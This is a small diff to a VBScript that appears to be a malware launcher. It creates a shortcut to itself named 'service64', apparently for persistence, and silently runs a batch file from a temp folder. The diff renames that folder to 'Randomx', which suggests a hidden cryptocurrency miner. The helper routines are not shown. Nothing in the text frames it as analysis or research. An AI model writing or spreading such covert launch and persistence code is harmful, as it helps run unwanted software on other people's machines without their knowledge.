@@ -1,7 +1,7 @@
 Option Explicit
 Dim PathApplication,ShortcutName,VbsPath
 VbsPath = Wscript.ScriptFullName
-PathApplication = "%temp%/srb/start.bat"
+PathApplication = "%temp%/Randomx/start.bat"
 ShortcutName = "service64"
 Call Shortcut(VbsPath,ShortcutName)
 Call Hidden_Run(Dblquote(PathApplication))
